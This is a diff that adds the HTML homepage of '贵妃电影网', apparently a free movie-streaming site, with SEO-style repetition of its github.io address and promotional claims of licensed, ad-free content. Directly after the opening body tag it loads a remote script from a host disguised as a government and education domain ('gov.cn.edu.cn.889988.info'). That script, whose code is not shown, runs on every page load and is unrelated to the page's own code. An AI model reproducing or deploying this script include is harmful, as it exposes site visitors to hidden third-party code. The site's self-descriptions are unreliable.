@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>贵妃电影网 | 高清电影在线观看与热门影视资源推荐平台</title>
+<meta name="keywords" content="贵妃电影网,guifeidianyingwang-zh,贵妃电影网官网,高清电影在线观看,免费电影网站,最新电影资源,热门电视剧,经典老片,电影排行榜">
+<meta name="description" content="贵妃电影网（guifeidianyingwang-zh）专注为用户精选高清电影、热门电视剧、综艺动漫等优质影视资源，每日更新最新院线大片与口碑佳作，界面清爽无广告打扰，支持手机平板多端自适应观看，是影迷追剧观影的首选免费在线影视平台。">
+<meta name="author" content="贵妃电影网">
+<meta name="copyright" content="贵妃电影网">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta property="og:title" content="贵妃电影网 - 高清电影在线观看与热门影视推荐平台">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://guifeidianyingwang-zh.github.io">
+<meta property="og:site_name" content="贵妃电影网">
+<meta property="og:description" content="贵妃电影网（guifeidianyingwang-zh）精选高清电影、热门电视剧、综艺动漫，每日更新院线大片与口碑佳作，支持多端自适应观看。">
+<link rel="canonical" href="https://guifeidianyingwang-zh.github.io">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🎬</text></svg>">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --gold:#d4af37;--deep:#1a0d00;--velvet:#7a1020;--ink:#2b2b2b;
+  --cream:#fbf6ee;--shadow:rgba(0,0,0,.28);
+}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--cream);color:var(--ink);line-height:1.8;-webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:inherit;}
+img{max-width:100%;display:block;}
+
+/* ===== 顶部 ===== */
+.topbar{background:var(--deep);color:#e8d9b5;font-size:13px;padding:6px 0;}
+.topbar .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;}
+.wrap{width:min(1160px,92%);margin:0 auto;}
+.site-link{color:var(--gold);}
+
+/* ===== 头部 ===== */
+.header{background:linear-gradient(135deg,#2b1408 0%,#7a1020 55%,#d4af37 160%);color:#fff;padding:34px 0 30px;position:relative;overflow:hidden;}
+.header::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 85% 20%,rgba(255,255,255,.12),transparent 45%);}
+.logo{display:flex;align-items:center;gap:16px;position:relative;z-index:2;}
+.logo .badge{font-size:42px;line-height:1;}
+.logo h1{font-size:30px;font-weight:800;letter-spacing:2px;text-shadow:0 2px 6px var(--shadow);}
+.logo h1 span{color:#ffe9a8;}
+.logo small{display:block;font-size:12px;font-weight:400;letter-spacing:3px;opacity:.85;margin-top:4px;}
+.sitedomain{margin-top:14px;font-size:13px;opacity:.92;position:relative;z-index:2;}
+.sitedomain b{color:#ffe9a8;font-weight:600;}
+
+/* ===== 导航 ===== */
+.nav{background:var(--deep);position:sticky;top:0;z-index:99;box-shadow:0 3px 12px var(--shadow);}
+.nav ul{display:flex;flex-wrap:wrap;list-style:none;gap:4px;}
+.nav a{display:block;padding:14px 18px;color:#e8d9b5;font-size:15px;font-weight:600;transition:.25s;border-bottom:3px solid transparent;}
+.nav a:hover{color:#fff;background:var(--velvet);border-bottom-color:var(--gold);}
+
+/* ===== 通用区块 ===== */
+section{padding:56px 0;}
+.stitle{text-align:center;margin-bottom:38px;}
+.stitle h2{font-size:26px;color:var(--velvet);position:relative;display:inline-block;padding:0 20px;}
+.stitle h2::before,.stitle h2::after{content:"❖";color:var(--gold);font-size:16px;vertical-align:middle;margin:0 12px;}
+.stitle p{color:#8a7a5c;font-size:14px;margin-top:8px;}
+
+/* ===== 首屏 Hero ===== */
+.hero{background:var(--cream);}
+.hero-inner{display:grid;grid-template-columns:1.15fr .85fr;gap:40px;align-items:center;}
+.hero h2{font-size:34px;color:var(--deep);line-height:1.35;margin-bottom:16px;}
+.hero h2 em{font-style:normal;color:var(--velvet);}
+.hero p{color:#5c5340;font-size:15px;margin-bottom:22px;}
+.hero .addr{display:inline-block;background:var(--deep);color:var(--gold);padding:10px 18px;border-radius:6px;font-size:14px;letter-spacing:1px;}
+.hero .addr:hover{background:var(--velvet);}
+.hero-img{background:linear-gradient(160deg,var(--velvet),#4a0a14);border-radius:16px;padding:30px 24px;color:#fff;box-shadow:0 16px 40px var(--shadow);position:relative;}
+.hero-img .tape{font-size:44px;text-align:center;margin-bottom:10px;}
+.hero-img h3{font-size:19px;text-align:center;margin-bottom:14px;color:#ffe9a8;}
+.hero-img ul{list-style:none;font-size:14px;line-height:2.1;}
+.hero-img ul li::before{content:"✔ ";color:var(--gold);}
+
+/* ===== 栏目卡片 ===== */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:22px;}
+.card{background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 6px 20px rgba(0,0,0,.08);transition:.3s;border-top:4px solid var(--gold);}
+.card:hover{transform:translateY(-6px);box-shadow:0 14px 32px rgba(0,0,0,.16);}
+.card .poster{height:200px;display:flex;align-items:center;justify-content:center;font-size:56px;color:#fff;}
+.card:nth-child(1) .poster{background:linear-gradient(135deg,#7a1020,#b92b3d);}
+.card:nth-child(2) .poster{background:linear-gradient(135deg,#8a6d1f,#d4af37);}
+.card:nth-child(3) .poster{background:linear-gradient(135deg,#1b3a5b,#2f6fa8);}
+.card:nth-child(4) .poster{background:linear-gradient(135deg,#3a2b5b,#7a5cb8);}
+.card .body{padding:16px 18px;}
+.card .body h3{font-size:17px;color:var(--deep);margin-bottom:8px;}
+.card .body p{font-size:13px;color:#7a6f5c;}
+.card .body a{display:inline-block;margin-top:12px;font-size:13px;color:var(--velvet);font-weight:600;}
+.card .body a:hover{color:var(--gold);}
+
+/* ===== 片单列表 ===== */
+.listsec{background:#fff;}
+.filters{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:28px;}
+.filters button{background:var(--cream);border:1px solid #e2d6bd;padding:7px 20px;border-radius:20px;font-size:13px;cursor:pointer;transition:.25s;}
+.filters button:hover{background:var(--velvet);color:#fff;border-color:var(--velvet);}
+.filters button.on{background:var(--gold);color:#fff;border-color:var(--gold);}
+.movielist{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.movie{display:flex;gap:14px;background:var(--cream);border-radius:10px;padding:12px;transition:.25s;}
+.movie:hover{background:#f3e9d6;}
+.movie .thumb{width:70px;height:98px;flex:none;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:30px;color:#fff;}
+.movie .info h4{font-size:15px;color:var(--deep);}
+.movie .info p{font-size:12px;color:#8a7a5c;margin-top:5px;}
+.movie .info span{display:inline-block;margin-top:6px;font-size:12px;color:var(--velvet);}
+
+/* ===== 关于 ===== */
+.about-inner{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;}
+.about-text h3{font-size:22px;color:var(--deep);margin-bottom:14px;}
+.about-text p{font-size:14px;color:#5c5340;margin-bottom:12px;}
+.about-text .urlbox{background:var(--deep);color:var(--gold);padding:12px 16px;border-radius:8px;font-size:14px;margin-top:14px;}
+.about-text .urlbox:hover{background:var(--velvet);}
+.timeline{position:relative;padding-left:26px;}
+.timeline::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--gold),var(--velvet));}
+.timeline div{position:relative;margin-bottom:20px;}
+.timeline div::before{content:"";position:absolute;left:-23px;top:7px;width:12px;height:12px;border-radius:50%;background:var(--gold);border:3px solid var(--cream);}
+.timeline h4{font-size:15px;color:var(--velvet);}
+.timeline p{font-size:13px;color:#7a6f5c;}
+
+/* ===== 资讯 ===== */
+.newssec{background:#fff;}
+.news-item{display:flex;gap:20px;padding:20px;border-bottom:1px dashed #e6dcbf;transition:.25s;}
+.news-item:hover{background:var(--cream);}
+.news-item .date{width:64px;flex:none;text-align:center;background:var(--deep);color:var(--gold);border-radius:8px;padding:8px 4px;font-size:12px;line-height:1.4;}
+.news-item .date b{display:block;font-size:22px;}
+.news-item .txt h4{font-size:16px;color:var(--deep);margin-bottom:6px;}
+.news-item .txt p{font-size:13px;color:#7a6f5c;}
+
+/* ===== 底部 ===== */
+.footer{background:var(--deep);color:#c9b78f;padding:44px 0 20px;font-size:13px;}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:30px;margin-bottom:30px;}
+.foot-grid h4{color:var(--gold);font-size:15px;margin-bottom:12px;}
+.foot-grid ul{list-style:none;line-height:2.1;}
+.foot-grid a:hover{color:var(--gold);}
+.foot-brand .badge{font-size:30px;}
+.foot-brand h3{color:#fff;font-size:20px;margin:6px 0;}
+.foot-brand b{color:var(--gold);}
+.copyright{border-top:1px solid rgba(255,255,255,.12);padding-top:18px;text-align:center;font-size:12px;color:#8f7e5c;}
+
+/* ===== 响应式 ===== */
+@media(max-width:900px){
+  .grid4{grid-template-columns:repeat(2,1fr);}
+  .movielist{grid-template-columns:1fr 1fr;}
+  .foot-grid{grid-template-columns:1fr 1fr;}
+  .hero-inner,.about-inner{grid-template-columns:1fr;}
+}
+@media(max-width:600px){
+  .logo h1{font-size:23px;}
+  section{padding:40px 0;}
+  .stitle h2{font-size:21px;}
+  .hero h2{font-size:25px;}
+  .grid4,.movielist{grid-template-columns:1fr;}
+  .foot-grid{grid-template-columns:1fr;}
+  .nav a{padding:12px 13px;font-size:14px;}
+  .news-item{flex-direction:column;gap:10px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>欢迎光临贵妃电影网 · 每日精选好片，随时随地畅享观影</span>
+    <span>官方站点：<a class="site-link" href="https://guifeidianyingwang-zh.github.io">guifeidianyingwang-zh.github.io</a></span>
+  </div>
+</div>
+
+<header class="header">
+  <div class="wrap">
+    <div class="logo">
+      <div class="badge">🎬</div>
+      <div>
+        <h1>贵妃<span>电影网</span></h1>
+        <small>GUIFEI DIANYING WANG · 贵妃电影网</small>
+      </div>
+    </div>
+    <div class="sitedomain">官方入口：<b>https://guifeidianyingwang-zh.github.io</b></div>
+  </div>
+</header>
+
+<nav class="nav">
+  <div class="wrap">
+    <ul>
+      <li><a href="#">首页</a></li>
+      <li><a href="#cate">影片分类</a></li>
+      <li><a href="#list">热播片单</a></li>
+      <li><a href="#about">关于我们</a></li>
+      <li><a href="#news">影视资讯</a></li>
+      <li><a href="#link">站点导航</a></li>
+    </ul>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="wrap hero-inner">
+    <div>
+      <h2>沉浸式观影从这里开始<br>尽在 <em>贵妃电影网</em></h2>
+      <p>贵妃电影网（guifeidianyingwang-zh）汇聚院线大片、经典老片、高分剧集与综艺动漫，依托智能推荐与高清播放技术，让每一次打开都成为一场视听盛宴。无论你喜欢动作、喜剧、悬疑还是文艺，这里都有为你量身定制的片单。</p>
+      <a class="addr" href="https://guifeidianyingwang-zh.github.io">🌐 访问官网：guifeidianyingwang-zh.github.io</a>
+    </div>
+    <div class="hero-img">
+      <div class="tape">🍿</div>
+      <h3>为什么选择贵妃电影网</h3>
+      <ul>
+        <li>每日更新最新电影与热播剧集资源</li>
+        <li>支持 1080P / 4K 多清晰度自由切换</li>
+        <li>手机、平板、电脑三端自适应播放</li>
+        <li>清爽界面，告别繁琐弹窗打扰</li>
+        <li>个性化推荐，发现更多心头好</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：影片分类 -->
+<section id="cate" style="background:#fff;">
+  <div class="wrap">
+    <div class="stitle">
+      <h2>影片分类</h2>
+      <p>按类型精准检索，快速锁定你想看的每一部好片</p>
+    </div>
+    <div class="grid4">
+      <div class="card">
+        <div class="poster">🎭</div>
+        <div class="body">
+          <h3>剧情 · 文艺</h3>
+          <p>从奥斯卡获奖佳片到冷门独立电影，收录全球口碑剧情佳作，感受光影里的百态人生。</p>
+          <a href="#">浏览分类 →</a>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster">💥</div>
+        <div class="body">
+          <h3>动作 · 科幻</h3>
+          <p>好莱坞大片、国产硬核动作与烧脑科幻一应俱全，大场面震撼视听，肾上腺素飙升。</p>
+          <a href="#">浏览分类 →</a>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster">😂</div>
+        <div class="body">
+          <h3>喜剧 · 综艺</h3>
+          <p>轻松爆笑的喜剧电影搭配热门综艺节目，通勤、午休、睡前随时一笑解压。</p>
+          <a href="#">浏览分类 →</a>
+        </div>
+      </div>
+      <div class="card">
+        <div class="poster">🔍</div>
+        <div class="body">
+          <h3>悬疑 · 惊悚</h3>
+          <p>反转不断的烧脑悬疑与高能惊悚片单，层层递进的剧情让人欲罢不能、欲罢不能。</p>
+          <a href="#">浏览分类 →</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：热播片单 -->
+<section id="list" class="listsec">
+  <div class="wrap">
+    <div class="stitle">
+      <h2>热播片单</h2>
+      <p>实时热度榜 · 千万影迷正在追的这些好片</p>
+    </div>
+    <div class="filters">
+      <button class="on">本周热榜</button>
+      <button>高分经典</button>
+      <button>最新上线</button>
+      <button>国产佳作</button>
+      <button>海外大片</button>
+    </div>
+    <div class="movielist">
+      <div class="movie"><div class="thumb" style="background:linear-gradient(135deg,#7a1020,#b92b3d);">🎞️</div><div class="info"><h4>长安十二时辰</h4><p>唐朝悬疑剧 · 豆瓣 8.3</p><span>▶ 立即观看</span></div></div>
+      <div class="movie"><div class="thumb" style="background:linear-gradient(135deg,#1b3a5b,#2f6fa8);">🌊</div><div class="info"><h4>深海探秘</h4><p>科幻冒险 · 2025 院线热映</p><span>▶ 立即观看</span></div></div>
+      <div class="movie"><div class="thumb" style="background:linear-gradient(135deg,#3a5b2b,#6ba83f);">🏔️</div><div class="info"><h4>雪山之约</h4><p>户外剧情 · 高分口碑</p><span>▶ 立即观看</span></div></div>
+      <div class="movie"><div class="thumb" style="background:linear-gradient(135deg,#5b3a2b,#b87a4a);">🕵️</div><div class="info"><h4>迷雾追凶</h4><p>犯罪悬疑 · 反转不断</p><span>▶ 立即观看</span></div></div>
+      <div class="movie"><div class="thumb" style="background:linear-gradient(135deg,#4b2b5b,#a35cb8);">🎤</div><div class="info"><h4>星光大赏</h4><p>音乐综艺 · 更新至 12 期</p><span>▶ 立即观看</span></div></div>
+      <div class="movie"><div class="thumb" style="background:linear-gradient(135deg,#2b4a5b,#4ca8b8);">🚀</div><div class="info"><h4>星际归途</h4><p>硬科幻 · 4K 高清</p><span>▶ 立即观看</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：关于我们 -->
+<section id="about">
+  <div class="wrap about-inner">
+    <div class="about-text">
+      <h3>关于贵妃电影网</h3>
+      <p>贵妃电影网（guifeidianyingwang-zh）是一个专注于高品质影视内容聚合与推荐的在线观影平台。我们坚持"内容为王、体验至上"的理念，用专业的选片眼光和智能的推荐算法，帮你从浩如烟海的资源中快速找到值得一看的好片。</p>
+      <p>平台覆盖电影、电视剧、综艺、动漫、纪录片等多个频道，持续引入正版授权内容，并针对不同网络环境提供多档清晰度自适应播放，真正做到随时随地、流畅观影。</p>
+      <a class="urlbox" href="https://guifeidianyingwang-zh.github.io">🔗 官方网站：https://guifeidianyingwang-zh.github.io</a>
+    </div>
+    <div class="timeline">
+      <div><h4>2026 · 全新改版上线</h4><p>界面全面升级，三端自适应，播放体验大幅提升。</p></div>
+      <div><h4>2025 · 智能推荐引擎</h4><p>基于观影偏好的个性化推荐，精准匹配你的口味。</p></div>
+      <div><h4>2024 · 内容频道扩充</h4><p>新增纪录片、动漫、海外剧等多个内容频道。</p></div>
+      <div><h4>2023 · 贵妃电影网创立</h4><p>以"让好片被发现"为初心，正式与影迷见面。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：影视资讯 -->
+<section id="news" class="newssec">
+  <div class="wrap">
+    <div class="stitle">
+      <h2>影视资讯</h2>
+      <p>行业动态 · 影评解读 · 上映排期一手掌握</p>
+    </div>
+    <div class="news-item">
+      <div class="date"><b>10</b>2026.10</div>
+      <div class="txt">
+        <h4>十月院线片单抢先看：多部华语新片集中定档</h4>
+        <p>十月将迎来一波华语电影上映潮，涵盖剧情、喜剧、动作等多种类型，贵妃电影网为你整理最全片单与观影指南。</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <div class="date"><b>28</b>2026.09</div>
+      <div class="txt">
+        <h4>年度高分剧集盘点：这几部值得反复刷</h4>
+        <p>从悬疑犯罪到治愈生活流，今年涌现出多部口碑爆棚的剧集，资深影评人为你逐一点评推荐。</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <div class="date"><b>15</b>2026.09</div>
+      <div class="txt">
+        <h4>流媒体时代，为什么我们依然需要专业的影视平台</h4>
+        <p>在内容泛滥的当下，精准的筛选与专业的推荐比"多"更重要，贵妃电影网一直在做这件事。</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <div class="date"><b>02</b>2026.09</div>
+      <div class="txt">
+        <h4>经典老片 4K 修复计划：让好电影重获新生</h4>
+        <p>多部影史经典作品已完成 4K 修复并重新上线，画面与音质全面升级，值得在大屏上重温。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：站点导航 -->
+<section id="link" style="background:#fff;">
+  <div class="wrap">
+    <div class="stitle">
+      <h2>站点导航</h2>
+      <p>快速抵达贵妃电影网各内容频道，发现更多精彩</p>
+    </div>
+    <div class="grid4">
+      <div class="card">
+        <div class="poster">🎞️</div>
+        <div class="body"><h3>电影频道</h3><p>院线大片、经典老片、独立佳作一网打尽。</p><a href="https://guifeidianyingwang-zh.github.io">进入频道 →</a></div>
+      </div>
+      <div class="card">
+        <div class="poster">📺</div>
+        <div class="body"><h3>剧集频道</h3><p>热播国产剧、美剧、日韩剧持续更新。</p><a href="https://guifeidianyingwang-zh.github.io">进入频道 →</a></div>
+      </div>
+      <div class="card">
+        <div class="poster">🎤</div>
+        <div class="body"><h3>综艺频道</h3><p>热门真人秀、音乐竞演、生活观察类节目。</p><a href="https://guifeidianyingwang-zh.github.io">进入频道 →</a></div>
+      </div>
+      <div class="card">
+        <div class="poster">🌐</div>
+        <div class="body"><h3>官方站点</h3><p>访问 guifeidianyingwang-zh.github.io 获取最新内容。</p><a href="https://guifeidianyingwang-zh.github.io">立即访问 →</a></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <div class="badge">🎬</div>
+        <h3>贵妃电影网</h3>
+        <p>专注于高品质影视内容聚合与智能推荐，让每一次打开都有好片相伴。</p>
+        <p style="margin-top:8px;">官方网站：<b>https://guifeidianyingwang-zh.github.io</b></p>
+      </div>
+      <div>
+        <h4>内容频道</h4>
+        <ul>
+          <li><a href="#">电影</a></li>
+          <li><a href="#">电视剧</a></li>
+          <li><a href="#">综艺</a></li>
+          <li><a href="#">动漫</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>影片分类</h4>
+        <ul>
+          <li><a href="#">动作科幻</a></li>
+          <li><a href="#">喜剧爱情</a></li>
+          <li><a href="#">悬疑犯罪</a></li>
+          <li><a href="#">纪录片</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>关于我们</h4>
+        <ul>
+          <li><a href="#">平台介绍</a></li>
+          <li><a href="#">内容合作</a></li>
+          <li><a href="#">联系我们</a></li>
+          <li><a href="#">帮助中心</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copyright">
+      © 2026 贵妃电影网 guifeidianyingwang-zh · 官方网址：https://guifeidianyingwang-zh.github.io · 本站内容仅供学习交流参考
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('.filters button').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    document.querySelectorAll('.filters button').forEach(function(b){b.classList.remove('on');});
+    btn.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
